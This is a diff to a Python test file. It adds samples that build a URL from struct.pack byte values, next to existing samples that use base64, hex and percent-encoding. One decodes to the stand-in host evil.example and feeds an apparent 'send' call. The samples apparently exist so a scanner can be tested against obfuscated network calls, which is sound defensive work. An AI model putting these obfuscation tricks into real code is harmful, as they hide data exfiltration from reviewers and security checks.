@@ -3863,6 +3863,10 @@ def test_a_builder_or_a_docstring_reader_that_arrives_by_import_refuses_it():
         + 'url = b.b64decode("aHR0cHM6").decode()\n' + send,
         'from binascii import unhexlify as h\n' + hub
         + 'url = h("68747470733a").decode()\n' + send,
+        'import struct\n' + hub
+        + 'url = struct.pack("5B", 104, 116, 116, 112, 115).decode()\n' + send,
+        'from struct import pack as pk\n' + hub
+        + 'url = pk("5B", 104, 116, 116, 112, 115).decode()\n' + send,
         'from urllib.parse import unquote as u\n' + hub
         + 'url = u("https%3A%2F%2Fevil.example%2Fc")\n' + send,
         'from inspect import getdoc as g\n' + hub + docstring
